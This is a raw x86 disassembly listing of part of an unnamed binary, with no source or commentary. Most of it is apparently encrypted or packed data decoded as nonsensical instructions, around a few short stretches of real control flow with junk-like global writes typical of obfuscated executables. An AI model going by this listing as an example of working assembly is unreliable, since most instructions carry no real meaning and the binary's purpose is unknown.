  415e5c:	sbb    al,0x15
  415e5e:	mov    BYTE PTR [ebx],al
  415e60:	aaa    
  415e61:	fst    st(0)
  415e63:	jg     0x415e19
  415e65:	lods   al,BYTE PTR ds:[esi]
  415e66:	fiadd  DWORD PTR [ecx]
  415e68:	sub    BYTE PTR [edx],dh
  415e6a:	jl     0x415e14
  415e6c:	mov    eax,DWORD PTR [edx-0x1c4df963]
  415e72:	outs   dx,BYTE PTR ds:[esi]
  415e73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e74:	mov    dh,0x7
  415e76:	sbb    bh,BYTE PTR [ecx+0x2b]
  415e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e7a:	sbb    DWORD PTR [edx+0x3ac6f20],esi
  415e80:	nop
  415e81:	and    DWORD PTR [ecx+0x22],esi
  415e84:	xchg   edx,eax
  415e85:	sbb    BYTE PTR [edx],cl
  415e87:	mov    al,0xbb
  415e89:	rol    BYTE PTR [ebx-0x5d],0xf
  415e8d:	or     BYTE PTR [eax],cl
  415e8f:	inc    esi
  415e90:	stc    
  415e91:	ja     0x415e90
  415e93:	dec    ebp
  415e94:	adc    BYTE PTR [esp+eax*1-0x1],bl
  415e98:	adc    edi,DWORD PTR [ebp-0x5]
  415e9b:	jge    0x415e2a
  415e9d:	pop    ebp
  415e9e:	mov    ebp,0x2099295
  415ea3:	sbb    DWORD PTR [ecx+0x3f],edi
  415ea6:	ds in  al,dx
  415ea8:	fcomip st,st(4)
  415eaa:	dec    ebx
  415eab:	(bad)  
  415eac:	call   0x482339ab
  415eb1:	add    ch,BYTE PTR [ebp+0x5be06f8e]
  415eb7:	sbb    edx,DWORD PTR [ebp+0x1b]
  415eba:	mov    cl,0xd4
  415ebc:	pop    es
  415ebd:	pop    esp
  415ebe:	inc    esi
  415ebf:	pop    esp
  415ec0:	mov    dh,0x7a
  415ec2:	(bad)  
  415ec3:	mov    ds:0x1c48630b,al
  415ec8:	push   ebx
  415ec9:	leave  
  415eca:	dec    eax
  415ecb:	dec    esp
  415ecc:	mov    esp,0xf0d522bf
  415ed1:	clc    
  415ed2:	pop    eax
  415ed3:	retf   0x4c6c
  415ed6:	repz cs pop esi
  415ed9:	add    edi,DWORD PTR cs:[eax]
  415edc:	mov    ecx,0x71c3499a
  415ee1:	leave  
  415ee2:	push   es
  415ee3:	mov    eax,0x45891bf6
  415ee8:	clc    
  415ee9:	mov    DWORD PTR ds:0x42a77d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a801,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a805,0x42a7c1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	jmp    FWORD PTR [edi+0x1a27ecbc]
  415f50:	jg     0x415fca
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415fce
  415f57:	pop    es
  415f58:	xlat   BYTE PTR ds:[ebx]
  415f59:	and    al,0x44
  415f5b:	aaa    
  415f5c:	loopne 0x415f08
  415f5e:	xor    eax,0xbd23a9e
  415f63:	pop    es
  415f64:	push   es
  415f65:	xchg   edi,eax
  415f66:	test   DWORD PTR [edx],esp
  415f68:	sub    dl,BYTE PTR [edx]
  415f6a:	pop    ds
  415f6b:	cmp    cl,dh
  415f6d:	xor    BYTE PTR [edi-0x69],ch
  415f70:	push   es
  415f71:	cmp    DWORD PTR [esi+0x6b],esi
  415f74:	xor    eax,0x8e59c205
  415f79:	test   dl,0x8
  415f7c:	into   
  415f7d:	shl    DWORD PTR [esi-0x1b],1
  415f80:	jns    0x415fcc
  415f82:	push   esp
  415f83:	mov    bl,0x81
  415f85:	cmp    eax,0x721d1bb6
  415f8a:	(bad)  
  415f8b:	loopne 0x415f11
  415f8d:	add    BYTE PTR [edx+eax*1+0x402be1],bl
  415f94:	pop    ebp
  415f95:	fnsave [esi-0x4926f488]
  415f9b:	ins    BYTE PTR es:[edi],dx
  415f9c:	out    dx,al
  415f9d:	add    DWORD PTR [edi+0x33],edi
  415fa0:	das    
  415fa1:	gs out 0xef,eax
  415fa4:	pop    ss
  415fa5:	cmp    BYTE PTR [esi-0x178868f4],dh
  415fab:	inc    esp
  415fac:	pop    es
  415fad:	push   ecx
  415fae:	leave  
  415faf:	popa   
  415fb0:	ss inc eax
  415fb2:	mov    dl,0xfb
  415fb4:	imul   ecx,ebx,0x1d
  415fb7:	jo     0x415fa5
  415fb9:	adc    DWORD PTR [edi-0x51],edx
  415fbc:	into   
  415fbd:	enter  0xa202,0x26
  415fc1:	fstp   TBYTE PTR [eax+esi*1]
  415fc4:	adc    BYTE PTR [edx+edx*2+0x65],dl
  415fc8:	mov    dl,0x26
  415fca:	or     DWORD PTR [ebx],esp
  415fcc:	inc    edx
  415fcd:	jp     0x416027
  415fcf:	out    0xd8,al
  415fd1:	jecxz  0x415f9d
  415fd3:	out    dx,eax
  415fd4:	test   al,dl
  415fd6:	jge    0x415ff8
  415fd8:	out    0x11,al
  415fda:	mov    eax,0x2b3b5f3f
  415fdf:	retf   
  415fe0:	or     eax,0xf00a2295
  415fe5:	mov    ah,0x7b
  415fe7:	inc    esi
  415fe8:	cli    
  415fe9:	pop    esi
  415fea:	sbb    dl,BYTE PTR [esi+esi*4+0x1958bc59]
  415ff1:	pop    ss
  415ff2:	les    esp,FWORD PTR [eax+0x6c]
  415ff5:	jae    0x415f96
  415ff7:	mov    ah,0x5d
  415ff9:	mov    bl,0x13
  415ffb:	jns    0x41602a
  415ffd:	xlat   BYTE PTR ds:[ebx]
  415ffe:	aam    0xbe
  416000:	inc    esp
  416001:	or     ebx,DWORD PTR [edi+esi*2-0x20]
  416005:	(bad)  [edx]
  416007:	sahf   
  416008:	cmp    DWORD PTR [edi],esi
  41600a:	xchg   ebx,eax
  41600b:	scas   eax,DWORD PTR es:[edi]
  41600c:	fld    DWORD PTR [edi-0x5e51e759]
  416012:	xchg   BYTE PTR [edx-0x44],bh
  416015:	int    0x78
  416017:	imul   esi,DWORD PTR [ebx-0x6d518cdc],0xcca656fc
  416021:	pop    esp
  416022:	aad    0x5a
  416024:	fcmovb st,st(4)
  416026:	bound  esp,QWORD PTR es:[edi]
  416029:	jnp    0x416025
  41602b:	rol    DWORD PTR [ebx-0x18f3e5e9],1
  416031:	add    DWORD PTR [ebx+eax*1],edx
  416034:	mov    ebp,gs
  416036:	aam    0xbd
  416038:	sbb    BYTE PTR [ebx+0x5df81ce7],0xe
  41603f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416040:	dec    ebx
  416041:	mov    ch,0x41
  416043:	outs   dx,BYTE PTR ds:[esi]
  416044:	out    0x70,al
  416046:	mov    ebx,0x5e9182f2
  41604b:	pop    ebp
  41604c:	push   ss
  41604d:	jae    0x416005
  41604f:	push   es
  416050:	xchg   edx,eax
  416051:	(bad)  
  416052:	popa   
  416053:	push   edx
  416054:	(bad)  
  416056:	sbb    al,0x23
  416058:	pop    ds
  416059:	mov    ch,0xcc
  41605b:	dec    ebp
  41605c:	cmp    BYTE PTR [edi-0x30091d77],al
  416062:	inc    ebx
  416063:	fcom   st(3)
  416065:	add    BYTE PTR [edx+0x633373ef],cl
  41606b:	std    
  41606c:	xchg   edi,eax
  41606d:	add    bh,BYTE PTR ss:[esp-0xfdcffb4]
  416075:	aad    0xd3
  416077:	add    ebx,DWORD PTR [edx]
  416079:	es pop edx
  41607b:	les    esp,FWORD PTR [edi-0x6f]
  41607e:	(bad)  
  41607f:	rcl    ebp,cl
  416081:	(bad)  
  416082:	in     eax,dx
  416083:	xor    BYTE PTR [ecx-0xbd35a2],0x21
  41608a:	pop    ebx
  41608b:	jge    0x416046
  41608d:	shl    DWORD PTR [ebx-0x47],0xfe
  416091:	ins    DWORD PTR es:[edi],dx
  416092:	pop    ds
  416093:	xchg   edi,eax
  416094:	ja     0x416075
  416096:	pop    edi
  416097:	add    BYTE PTR [ecx-0x61],dh
  41609a:	pop    esi
  41609b:	cdq    
  41609c:	lods   al,BYTE PTR ds:[esi]
  41609d:	mov    dl,0xe8
  41609f:	lods   eax,DWORD PTR es:[esi]
  4160a1:	jmp    0x9b3:0x7e74dcb
  4160a8:	das    
  4160a9:	leave  
  4160aa:	dec    esp
  4160ab:	jp     0x416074
  4160ad:	imul   DWORD PTR [esi-0x2c64435c]
  4160b3:	popa   
  4160b4:	sbb    BYTE PTR [edi+0x1020e45d],ch
  4160ba:	mov    DWORD PTR [ebp+0x45575717],ebx
  4160c0:	sbb    al,0x6e
  4160c2:	jg     0x416124
  4160c4:	fld    st(2)
  4160c6:	fcmovnb st,st(0)
  4160c8:	dec    edi
  4160c9:	inc    edi
  4160ca:	nop
  4160cb:	in     eax,0xdd
  4160cd:	dec    esi
  4160ce:	sbb    DWORD PTR [eax-0x1e],ebp
  4160d1:	(bad)  
  4160d2:	das    
  4160d3:	arpl   WORD PTR [ecx-0x7192c207],bp
  4160d9:	xor    dh,ah
  4160db:	out    0xab,al
  4160dd:	lods   eax,DWORD PTR ds:[esi]
  4160de:	sub    BYTE PTR [edx],0x50
  4160e1:	in     al,dx
  4160e2:	mov    ebp,0x3492e90c
  4160e7:	addr16 mov ch,0x5
  4160ea:	dec    esi
  4160eb:	int    0x69
  4160ed:	ja     0x4160da
  4160ef:	stos   BYTE PTR es:[edi],al
  4160f0:	mov    eax,0x48432d60
  4160f5:	outs   dx,DWORD PTR ds:[esi]
  4160f6:	cmp    ch,dh
  4160f8:	sbb    dh,dh
  4160fa:	test   DWORD PTR [ebp+edx*8+0x5808a14c],0x6a392406
  416105:	mov    ch,0xc
  416107:	aaa    
  416108:	ins    DWORD PTR es:[edi],dx
  416109:	mov    esp,esi
  41610b:	test   al,0x54
  41610d:	or     DWORD PTR [ecx-0x2bd667e2],ebp
  416113:	fwait
  416114:	inc    eax
  416116:	or     bl,cl
  416118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416119:	bnd jmp 0xf32b8dbd
  41611f:	scas   eax,DWORD PTR es:[edi]
  416120:	in     al,0x30
  416122:	jb     0x416119
  416124:	push   ecx
  416125:	iret   
  416126:	mov    bh,0x86
  416128:	call   0x2fbfa97f
  41612d:	retf   0x81fb
  416130:	cmc    
  416131:	int    0x16
  416133:	fwait
  416134:	adc    dh,ch
  416136:	dec    ebp
  416137:	test   DWORD PTR [esi],edx
  416139:	or     DWORD PTR [ebp-0x29],ecx
  41613c:	setae  BYTE PTR [ebx+0x50f7b5dd]
  416143:	mov    edi,0xa48fb31
  416148:	pop    ds
  416149:	adc    ch,al
  41614b:	mov    WORD PTR ds:0x1180b566,gs
  416151:	jmp    0x41615c
  416153:	cmp    eax,0x80eb16fe
  416158:	pop    edi
  416159:	jmp    0xaa8a31f2
  41615e:	push   edi
  41615f:	inc    ebp
  416160:	repnz inc esi
  416162:	fwait
  416163:	pop    es
  416164:	pop    ebx
  416165:	sbb    BYTE PTR [ebp+0x5f],bl
  416168:	mov    DWORD PTR ds:0x7daf879e,esp
  41616e:	and    ebp,ecx
  416170:	es adc cl,cl
  416173:	in     eax,0x6e
  416175:	mov    ebx,0xe0528c4
  41617a:	in     eax,0xfc
  41617c:	daa    
  41617d:	int    0xa
  41617f:	push   edi
  416180:	pop    edx
  416181:	sbb    bh,dl
  416183:	scas   al,BYTE PTR es:[edi]
  416184:	dec    esp
  416185:	xor    eax,DWORD PTR [ecx]
  416187:	add    DWORD PTR [ecx],0xbf9e0edf
  41618d:	ja     0x4161f3
  41618f:	scas   al,BYTE PTR es:[edi]
  416190:	stos   BYTE PTR es:[edi],al
  416191:	push   esp
  416192:	and    al,0x14
  416194:	lock xor eax,DWORD PTR [esi-0x22]
  416198:	sub    ebp,0xbd8218d
  41619e:	clc    
  41619f:	inc    ebp
  4161a0:	in     eax,0x10
  4161a2:	out    dx,eax
  4161a3:	sbb    DWORD PTR [edx+esi*4],esi
  4161a6:	cwde   
  4161a7:	xor    eax,edi
  4161a9:	mov    DWORD PTR ss:[edx+0x6a],esi
  4161ad:	stc    
  4161ae:	cmp    esi,DWORD PTR [eax+0x5d1ff112]
  4161b4:	jmp    0x60e0:0x96e218a4
  4161bb:	(bad)  
  4161bc:	hlt    
  4161bd:	xchg   edi,eax
  4161be:	pop    ss
  4161bf:	jg     0x41614e
  4161c1:	test   ch,cl
  4161c3:	addr16 push ebp
  4161c5:	ds pop ebp
  4161c7:	jmp    0x416151
  4161c9:	call   0x484a:0x1ccc4b75
  4161d0:	fisttp DWORD PTR [esi-0x28e5c191]
  4161d6:	push   edx
  4161d7:	ror    DWORD PTR [ebp+0x33],cl
  4161da:	(bad)  
  4161db:	mov    ds:0x4aa50bbb,eax
  4161e0:	in     al,dx
  4161e1:	leave  
  4161e2:	and    BYTE PTR [eax],bl
  4161e4:	aam    0x2
  4161e6:	xchg   ebx,eax
  4161e7:	mov    BYTE PTR [esi+0x2],cl
  4161ea:	retf   0xf004
  4161ed:	pop    ebp
  4161ee:	stos   BYTE PTR es:[edi],al
  4161ef:	push   edx
  4161f0:	jo     0x41617d
  4161f2:	inc    ebp
  4161f3:	cld    
  4161f4:	mov    DWORD PTR ds:0x42a88d,0x1c
  4161fe:	cmp    DWORD PTR ds:0x42a88d,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a88d,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a88d,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a88d
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a88d,edx
  416249:	mov    edx,DWORD PTR ds:0x42a88d
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a88d,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a769,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a841,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x2f1d7c46]
  416290:	fnstsw WORD PTR [eax+ebx*1+0x7e95787f]
  416297:	js     0x416311
  416299:	ins    BYTE PTR es:[edi],dx
  41629a:	ret    0x5e17
  41629d:	(bad)  
  41629f:	mov    bh,BYTE PTR [esi]
  4162a1:	nop
  4162a2:	(bad)  
  4162a4:	mov    ebp,0xa66cfeb3
  4162a9:	cmp    al,0x30
  4162ab:	jmp    0xac1ccd7f
  4162b0:	mov    eax,0xed906161
  4162b5:	inc    ebx
  4162b6:	int    0xf1
  4162b8:	aaa    
  4162b9:	adc    edx,DWORD PTR [edx+edx*4]
  4162bc:	pop    ebp
  4162bd:	xchg   ebx,eax
  4162be:	aas    
  4162bf:	push   eax
  4162c0:	push   0xffffffe4
  4162c2:	sub    DWORD PTR [ebp+0x4a],ecx
  4162c5:	jmp    0x48f9dd41
  4162ca:	sub    BYTE PTR [eax-0x1640d13c],cl
  4162d0:	scas   eax,DWORD PTR es:[edi]
  4162d1:	cmp    DWORD PTR [edx],0x40
  4162d4:	int    0xbb
  4162d6:	clc    
  4162d7:	sub    al,0x7d
  4162d9:	dec    ebx
  4162da:	xor    cl,BYTE PTR [esi+0x22]
  4162dd:	adc    al,0xbd
  4162df:	sub    WORD PTR [eax-0x6b111472],dx
  4162e6:	mov    dl,0x80
  4162e8:	mov    bh,0x62
  4162ea:	mov    ebp,0xb0e8674a
  4162ef:	xchg   esp,eax
  4162f0:	mov    dl,0xf
  4162f2:	fiadd  DWORD PTR [eax-0x38]
  4162f5:	int3   
  4162f6:	lds    esi,FWORD PTR [edi+0x64]
  4162f9:	pop    edx
  4162fa:	ret    0x3411
  4162fd:	sbb    cl,ah
  4162ff:	dec    ebx
  416300:	xor    edi,DWORD PTR [ebx-0x42]
  416303:	mov    esi,0xc2f1c06f
  416308:	scas   eax,DWORD PTR es:[edi]
  416309:	cmp    DWORD PTR [eax+edi*4],ebp
  41630c:	stos   BYTE PTR es:[edi],al
  41630d:	xchg   esi,eax
  41630e:	jle    0x416300
  416310:	test   ecx,0x3b9bbe58
  416316:	ja     0x416364
  416318:	arpl   WORD PTR [ebx+0x52],bx
  41631b:	pusha  
  41631c:	dec    ch
  41631e:	test   BYTE PTR ss:0xfcdf7785,ah
  416325:	nop
  416326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416327:	push   0x68
  416329:	jmp    DWORD PTR [edx-0x17]
  41632c:	push   edi
  41632d:	stos   DWORD PTR es:[di],eax
  41632f:	les    edx,FWORD PTR [edi+0x580593b0]
  416335:	push   ds
  416336:	sub    BYTE PTR [esi],ah
  416338:	jns    0x4163b5
  41633a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41633b:	mov    dh,0xdb
  41633d:	dec    esp
  41633e:	push   ebp
  41633f:	mov    dh,0x5e
  416341:	mov    ebx,0x266cc0b0
  416346:	sub    al,0x5a
  416348:	mov    ecx,DWORD PTR [ebx+0x6714852a]
  41634e:	or     al,0x20
  416350:	dec    ebp
  416351:	mov    ebx,0x2bcfa8bd
  416356:	aam    0xc2
  416358:	out    dx,al
  416359:	retf   0xb5ea
  41635c:	pushf  
  41635d:	and    BYTE PTR [edi+0x38],0xbc
  416361:	mov    ebx,0x6d9597ac
  416366:	fxch   st(7)
  416368:	jbe    0x4163b5
  41636a:	lock in al,0xc2
  41636d:	out    0xea,al
  41636f:	sub    edi,esi
  416371:	loope  0x4163a6
  416373:	fstp   QWORD PTR [edi-0x1dc1e887]
  416379:	sub    ch,ch
  41637b:	sbb    eax,0xce60c517
  416380:	out    0xe6,eax
  416382:	dec    ebp
  416383:	sti    
  416384:	cli    
  416385:	and    eax,0xdc121006
  41638a:	test   ah,dh
  41638c:	fdiv   QWORD PTR [ebx]
  41638e:	dec    esp
  41638f:	stos   BYTE PTR es:[edi],al
  416390:	xchg   ebp,eax
  416391:	ret    0xc8e7
  416394:	retf   0xcb45
  416397:	pop    ebp
  416398:	aad    0xf9
  41639a:	leave  
  41639b:	stc    
  41639c:	(bad)  
  41639d:	in     eax,dx
  41639e:	dec    edx
  41639f:	add    bl,cl
  4163a1:	pop    esp
  4163a2:	push   ebx
  4163a3:	push   0xe40bcb6e
  4163a8:	add    bl,BYTE PTR [edi]
  4163aa:	mov    ah,0xe
  4163ac:	int    0x6c
  4163ae:	icebp  
  4163af:	inc    eax
  4163b0:	sub    eax,0x3b31d16a
  4163b5:	test   dl,dh
  4163b7:	xor    bl,BYTE PTR [esi+0x2d]
  4163ba:	int3   
  4163bb:	fwait
  4163bc:	push   edx
  4163bd:	loopne 0x416425
  4163bf:	mov    BYTE PTR [edx],ah
  4163c1:	pop    ebx
  4163c2:	push   0x3f
  4163c4:	and    BYTE PTR [ebp-0xa775bff],0xb0
  4163cb:	sub    ch,BYTE PTR [ebx]
  4163cd:	xor    DWORD PTR [eax],esi
  4163cf:	sbb    BYTE PTR [ecx],al
  4163d1:	lahf   
  4163d2:	jns    0x4163ed
  4163d4:	cmp    BYTE PTR [eax+ebp*1+0x198c8770],dh
  4163db:	repz cmp eax,DWORD PTR [ebx]
  4163de:	test   ebx,0x1f936c4f
  4163e4:	xchg   edx,eax
  4163e5:	in     eax,dx
  4163e6:	mov    ds:0xe65570e8,eax
  4163eb:	add    eax,0x5329dd73
  4163f0:	stc    
  4163f1:	dec    ebp
  4163f2:	jo     0x416442
  4163f4:	mov    DWORD PTR [edi],esi
  4163f6:	push   esi
  4163f7:	sub    DWORD PTR [edx],ecx
  4163f9:	pop    edx
  4163fa:	mov    bh,0x29
  4163fc:	jmp    0x86c:0xd8c57b97
  416403:	mov    esi,0xc92887d3
  416408:	stc    
  416409:	in     eax,0x46
  41640b:	jne    0x4163eb
  41640d:	add    al,0xe9
  41640f:	dec    edx
  416410:	sbb    edi,DWORD PTR [ebx+eax*8+0x1f]
  416414:	push   ebx
  416415:	ret    
  416416:	add    DWORD PTR [ebx+0x5c],0x41d3e16a
  41641d:	mov    al,bh
  41641f:	push   ds
  416420:	cs inc esi
  416422:	jae    0x41649b
  416424:	fist   WORD PTR [ecx-0x48]
  416427:	inc    esi
  416428:	mov    ah,0xc8
  41642a:	add    BYTE PTR [edx],0x80
  41642d:	mov    edx,0x592d272c
  416432:	mov    eax,0xf469f4dd
  416437:	pop    esp
  416438:	in     eax,0x88
  41643a:	cmp    cl,BYTE PTR [edi+0x8]
  41643d:	cwde   
  41643e:	mov    al,ds:0x240ccb5b
  416443:	inc    ebx
  416444:	sbb    BYTE PTR [edi-0x13f844b3],dh
  41644a:	stos   DWORD PTR es:[edi],eax
  41644b:	and    esp,DWORD PTR ss:[esp+ecx*4+0xb]
  416450:	inc    esi
  416451:	jbe    0x4164b2
  416453:	xlat   BYTE PTR ds:[ebx]
  416454:	outs   dx,BYTE PTR ds:[esi]
  416455:	pop    ebx
  416456:	pop    eax
  416457:	mov    DWORD PTR [esi],eax
  416459:	aas    
  41645a:	jmp    0x2f62bb50
  41645f:	cmp    bh,BYTE PTR [eax-0x7d]
  416462:	mov    bh,0x2e
  416464:	ret    
  416465:	aam    0xb4
  416467:	xor    DWORD PTR [edi+0x23104cde],esi
  41646d:	jmp    0xd714:0x9630eaa3
  416474:	mov    ebp,0xceaca907
  416479:	push   eax
  41647a:	pop    es
  41647b:	mov    dl,0x3
  41647d:	(bad)  
  41647e:	mov    edx,0xa0d5f846
  416483:	jecxz  0x416480
  416485:	xor    esp,DWORD PTR [esi]
  416487:	mov    bh,BYTE PTR [esi]
  416489:	mov    BYTE PTR ds:0x81f8462f,dh
  41648f:	mov    edx,DWORD PTR [esi+0x38dd06d6]
  416495:	inc    esi
  416496:	jge    0x416462
  416498:	or     DWORD PTR [ebp+0x55d72bf1],edx
  41649e:	ficomp DWORD PTR [ecx+0x30]
  4164a1:	cs pop esp
  4164a3:	pusha  
  4164a4:	test   eax,0xdd21178d
  4164a9:	pop    ss
  4164aa:	clc    
  4164ab:	mov    esi,DWORD PTR [edi-0x31]
  4164ae:	stos   DWORD PTR es:[edi],eax
  4164af:	cmp    eax,0x3dd24ea6
  4164b4:	cmp    eax,0xa2061aa1
  4164b9:	ret    0xf11f
  4164bc:	or     al,0x7d
  4164be:	and    eax,0x8bb42e19
  4164c3:	push   esp
  4164c4:	jg     0x416544
  4164c6:	xor    edi,ebp
  4164c8:	mov    dl,0x50
  4164ca:	xor    bl,bl
  4164cc:	lahf   
  4164cd:	mov    dl,0x15
  4164cf:	lds    ebp,FWORD PTR [eax-0x31]
  4164d2:	inc    di
  4164d4:	pop    edx
  4164d5:	cs jno 0x4164cc
  4164d8:	lea    ebx,[esi]
  4164da:	jne    0x416499
  4164dc:	push   0x917ddb82
  4164e1:	push   esp
  4164e2:	add    ch,bh
  4164e4:	dec    ecx
  4164e5:	mov    edx,0xf9e4ef34
  4164ea:	adc    BYTE PTR [esi+ebx*8],0x24
  4164ee:	leave  
  4164ef:	clc    
  4164f0:	repnz lods eax,DWORD PTR ds:[esi]
  4164f2:	das    
  4164f3:	fmul   st(2),st
  4164f5:	inc    cx
  4164f7:	ss push ds
  4164f9:	mov    esp,0xe00daa26
  4164fe:	loope  0x41656b
  416500:	(bad)  [esi]
  416502:	scas   eax,DWORD PTR es:[edi]
  416503:	call   0x6948a7d6
  416508:	cmp    DWORD PTR ds:0x2fd7bbad,0x7fa6e2cb
  416512:	jb     0x4164e8
  416514:	push   es
  416515:	sar    ebx,0xd0
  416518:	adc    al,0xcf
  41651a:	jmp    0x786deb8a
  41651f:	adc    BYTE PTR ds:[ebx+ebx*8-0x80],dl
  416524:	or     ecx,DWORD PTR [ebp+0x1e]
  416527:	push   ecx
  416528:	or     bh,dh
  41652a:	xchg   ecx,eax
  41652b:	cdq    
  41652c:	ins    BYTE PTR es:[edi],dx
  41652d:	in     eax,0xeb
  41652f:	test   al,0xd1
  416531:	ud0    eax,DWORD PTR [ebx]
  416534:	call   0x417d6b
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp-0x751c839a],cl
  416557:	xchg   edx,eax
  416558:	sbb    BYTE PTR [eax+0x787f1dd9],ch
  41655e:	xchg   ebp,eax
  41655f:	jle    0x4165d9
  416561:	js     0x416503
  416563:	adc    al,0x3b
  416565:	std    
  416566:	jecxz  0x4164f6
  416568:	not    DWORD PTR [edi-0x12]
  41656b:	ror    BYTE PTR [esi],0x2d
  41656e:	and    eax,0x92348c60
  416573:	cmp    eax,0x70ba5418
  416578:	pop    es
  416579:	push   edi
  41657a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41657b:	sub    ebp,DWORD PTR [eax+0x67a22c9a]
  416581:	retf   0xbba9
  416584:	push   ebx
  416585:	arpl   WORD PTR [esi-0x238f7f7],ax
  41658b:	pop    esi
  41658c:	lods   eax,DWORD PTR ds:[esi]
  41658d:	sub    DWORD PTR [eax],ebp
  41658f:	pop    edi
  416590:	or     DWORD PTR [esi-0xd4aa231],esi
  416596:	ret    0x819c
  416599:	sub    al,0x39
  41659b:	cs jne 0x416577
  41659e:	pop    ecx
  41659f:	mov    bh,0x30
  4165a1:	mov    esi,0x9c401fd7
  4165a6:	idiv   DWORD PTR [ebp-0x5]
  4165a9:	mov    cl,bh
  4165ab:	(bad)  
  4165ac:	cwde   
  4165ad:	and    eax,0x1470c0ad
  4165b2:	jge    0x4165d4
  4165b4:	je     0x416588
  4165b6:	mov    WORD PTR [ebp+eax*8+0x9],?
  4165ba:	or     ah,bl
  4165bc:	(bad)  
  4165bd:	mov    ds:0x95bbf029,eax
  4165c2:	loope  0x416555
  4165c4:	gs dec eax
  4165c6:	(bad)  
  4165c7:	enter  0x9ae4,0x97
  4165cb:	sbb    BYTE PTR [eax],ch
  4165cd:	inc    ebx
  4165ce:	mov    ebp,0x21af8b38
  4165d3:	fst    DWORD PTR [ecx+0xb528d1b]
  4165d9:	xor    DWORD PTR [edx-0x66],ecx
  4165dc:	(bad)  
  4165dd:	jg     0x416600
  4165df:	data16 mov bl,0xc4
  4165e2:	shl    esi,0x9d
  4165e5:	mov    ebp,0xb804e924
  4165ea:	pop    esp
  4165eb:	or     eax,0x3d6f36ef
  4165f0:	mov    bh,0x6
  4165f2:	jbe    0x4165cb
  4165f4:	mov    cl,0xaf
  4165f6:	stos   DWORD PTR es:[edi],eax
  4165f7:	push   es
  4165f8:	pushf  
  4165f9:	dec    ebx
  4165fa:	push   0xa7cd909d
  4165ff:	and    eax,0x366460f3
  416604:	ins    DWORD PTR es:[edi],dx
  416605:	in     eax,0x1a
  416607:	adc    eax,0xacb542fc
  41660c:	shl    DWORD PTR [esi+0x71],cl
  41660f:	sti    
  416610:	es adc edi,edx
  416613:	push   esi
  416614:	sub    eax,0x15485c44
  416619:	jmp    0x416685
  41661b:	js     0x416629
  41661d:	pusha  
  41661e:	in     al,0x31
  416620:	iret   
  416621:	cmp    DWORD PTR [edx],ecx
  416623:	lock das 
  416625:	add    bh,0xdb
  416628:	dec    ebp
  416629:	cmc    
  41662a:	cs mov edx,0x26dd9702
  416630:	in     al,dx
  416631:	test   DWORD PTR [edx*8+0x4e308293],ebp
  416638:	push   0x21ef838d
  41663d:	cmp    al,0x6c
  41663f:	or     al,0xe4
  416641:	pop    edi
  416642:	dec    ebp
  416643:	cmp    DWORD PTR [esi+0x7d],edi
  416646:	jo     0x416648
  416648:	lds    di,DWORD PTR [esi-0x15]
  41664c:	inc    cl
  41664e:	or     eax,0x7e76fbb8
  416653:	push   0x8feda908
  416658:	fwait
  416659:	mov    eax,0xe1f5039d
  41665e:	adc    DWORD PTR [esi],esp
  416660:	sbb    BYTE PTR [edi-0x5e],0xde
  416664:	sar    DWORD PTR [eax+esi*4-0x33fa3d97],0xcf
  41666c:	cmc    
  41666d:	fmulp  st(7),st
  41666f:	sbb    BYTE PTR [bx+si+0x60],dl
  416673:	dec    edx
  416674:	inc    eax
  416675:	imul   ebp,edx,0x57cb8650
  41667b:	inc    eax
  41667c:	jl     0x41667c
  41667e:	ficom  DWORD PTR [eax-0x7e992216]
  416684:	jge    0x41669a
  416686:	jo     0x4166fe
  416688:	loop   0x4166ab
  41668a:	pusha  
  41668b:	adc    eax,0x18ea61a8
  416690:	pop    eax
  416691:	imul   DWORD PTR [ebx+0x67]
  416694:	cmp    eax,0x7f007848
